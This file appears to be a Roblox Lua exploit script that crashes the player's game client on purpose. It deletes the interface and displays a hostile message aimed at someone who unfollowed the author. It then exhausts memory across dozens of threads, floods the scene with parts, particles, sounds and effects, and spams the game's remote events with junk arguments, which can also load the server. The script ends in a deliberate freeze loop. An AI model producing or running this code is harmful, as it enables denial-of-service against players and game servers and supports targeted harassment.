task.wait(7)

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local RunService = game:GetService("RunService")
local Replicated = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local Stats = game:GetService("Stats")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")

local env = getgenv and getgenv() or shared
if env.NUKE then
    return
end
env.NUKE = true

local cam = workspace.CurrentCamera
local pg = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
local KEEP = {}
local HOOKS = {}

pcall(function()
    setfpscap(9999)
end)

local THREADS = 32
local YIELD_EVERY = 6
local FREEZE_AT = 30
local MAX_CHUNK_MB = 256

-- ============================================================
-- PHASE 1 : ป้ายขึ้นก่อน
-- ============================================================
local function hideRobloxUi()
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)
    pcall(function()
        StarterGui:SetCore("TopbarEnabled", false)
    end)
    pcall(function()
        for _, c in ipairs(CoreGui:GetChildren()) do
            pcall(function()
                c:Destroy()
            end)
        end
    end)
end

pcall(function()
    pg:ClearAllChildren()
end)
hideRobloxUi()

local sg = Instance.new("ScreenGui")
sg.Name = "FuckYou"
sg.IgnoreGuiInset = true
sg.ResetOnSpawn = false
sg.DisplayOrder = 2147483647
sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
sg.Parent = pg

local bg = Instance.new("Frame")
bg.Size = UDim2.fromScale(1, 1)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.BorderSizePixel = 0
bg.Parent = sg

local txt = Instance.new("TextLabel")
txt.AnchorPoint = Vector2.new(0.5, 0.5)
txt.Position = UDim2.fromScale(0.5, 0.47)
txt.Size = UDim2.fromScale(1, 0.5)
txt.BackgroundTransparency = 1
txt.Font = Enum.Font.GothamBlack
txt.TextScaled = true
txt.Text = "Why did you unfollow me:(, And you tryna anikick"
txt.TextColor3 = Color3.fromRGB(255, 30, 30)
txt.Parent = bg

local stroke = Instance.new("UIStroke")
stroke.Thickness = 4
stroke.Color = Color3.fromRGB(255, 30, 30)
stroke.Transparency = 0.35
stroke.Parent = txt

local sub = Instance.new("TextLabel")
sub.AnchorPoint = Vector2.new(0.5, 0.5)
sub.Position = UDim2.fromScale(0.5, 0.82)
sub.Size = UDim2.fromScale(0.6, 0.06)
sub.BackgroundTransparency = 1
sub.Font = Enum.Font.Code
sub.TextScaled = true
sub.Text = "booting..."
sub.TextColor3 = Color3.fromRGB(140, 0, 0)
sub.Parent = bg

pcall(function()
    RunService.RenderStepped:Wait()
    RunService.RenderStepped:Wait()
    RunService.RenderStepped:Wait()
end)

-- ============================================================
-- PHASE 2 : ปล่อยของ
-- ============================================================
task.spawn(function()
    local last = 0
    while true do
        local mb = Stats:GetTotalMemoryUsageMb()
        local d = mb - last
        last = mb
        pcall(function()
            sub.Text = math.floor(mb) .. " MB  (" .. (d >= 0 and "+" or "") .. math.floor(d) .. ")"
        end)
        pcall(function()
            for _, c in ipairs(pg:GetChildren()) do
                if c.Name ~= "FuckYou" then
                    c:Destroy()
                end
            end
        end)
        task.wait(1)
    end
end)

for _ = 1, THREADS do
    task.spawn(function()
        local n = 0
        while true do
            n = n + 1
            local mb = math.min(32 * n, MAX_CHUNK_MB)
            pcall(function()
                KEEP[#KEEP + 1] = string.rep("N", mb * 1024 * 1024)
            end)
            pcall(function()
                KEEP[#KEEP + 1] = buffer.create(mb * 1024 * 1024)
            end)
            pcall(function()
                KEEP[#KEEP + 1] = table.create(math.min(2000000 * n, 8000000), 1)
            end)
            if n % YIELD_EVERY == 0 then
                task.wait()
            end
        end
    end)
end

task.spawn(function()
    local folder = Instance.new("Folder")
    folder.Parent = cam
    local n = 0
    while true do
        for _ = 1, 250 do
            local p = Instance.new("Part")
            p.Anchored = true
            p.CanCollide = false
            p.CanQuery = false
            p.Position = Vector3.new(math.random(-400, 400), math.random(-100, 300), math.random(-400, 400))
            p.Parent = folder
            n = n + 1
        end
        if n % 20 == 0 then
            task.wait()
        end
    end
end)

task.spawn(function()
    local folder = Instance.new("Folder")
    folder.Parent = cam
    local n = 0
    while true do
        for _ = 1, 20 do
            local p = Instance.new("Part")
            p.Anchored = true
            p.CanCollide = false
            p.CanQuery = false
            p.Transparency = 1
            p.Size = Vector3.new(1, 1, 1)
            p.Position = Vector3.new(math.random(-200, 200), math.random(0, 200), math.random(-200, 200))
            local pe = Instance.new("ParticleEmitter")
            pe.Rate = 3000
            pe.Lifetime = NumberRange.new(1, 5)
            pe.Speed = NumberRange.new(10, 40)
            pe.Size = NumberSequence.new(0.6, 0)
            pe.Parent = p
            p.Parent = folder
            n = n + 1
        end
        if n % 20 == 0 then
            task.wait()
        end
    end
end)

task.spawn(function()
    local names = {"ColorCorrectionEffect", "BloomEffect", "BlurEffect"}
    local i = 0
    while true do
        for _ = 1, 12 do
            i = i + 1
            Instance.new(names[(i % #names) + 1]).Parent = Lighting
        end
        task.wait(0.3)
    end
end)

task.spawn(function()
    for _ = 1, 120 do
        HOOKS[#HOOKS + 1] = RunService.RenderStepped:Connect(function(dt)
            local t = table.create(400)
            for j = 1, 400 do
                t[j] = math.sin(j * dt) * math.random()
            end
            table.sort(t, function(a, b) return a < b end)
        end)
    end
end)

task.spawn(function()
    local function rec(n)
        return rec(n + 1) + 1
    end
    while true do
        pcall(rec, 1)
        task.wait()
    end
end)

task.spawn(function()
    local folder = Instance.new("Folder")
    folder.Parent = cam
    while true do
        for _ = 1, 40 do
            local s = Instance.new("Sound")
            s.SoundId = "rbxassetid://9114221329"
            s.Volume = 0.1
            s.Playing = true
            s.Parent = folder
        end
        task.wait(0.5)
    end
end)

task.spawn(function()
    local junk = table.create(250)
    for i = 1, 250 do
        junk[i] = {i, tostring(i), Vector3.zero}
    end
    while true do
        for _, r in ipairs(Replicated:GetDescendants()) do
            if r:IsA("RemoteEvent") then
                pcall(r.FireServer, r, table.unpack(junk))
            elseif r:IsA("RemoteFunction") then
                pcall(r.InvokeServer, r, table.unpack(junk))
            end
        end
        task.wait()
    end
end)

-- ============================================================
-- PHASE 3 : freeze
-- ============================================================
task.delay(FREEZE_AT, function()
    local size = 128
    while true do
        local ok = pcall(function()
            KEEP[#KEEP + 1] = string.rep("N", size * 1024 * 1024)
        end)
        if not ok then
            size = math.max(math.floor(size / 2), 4)
        end
    end
end)
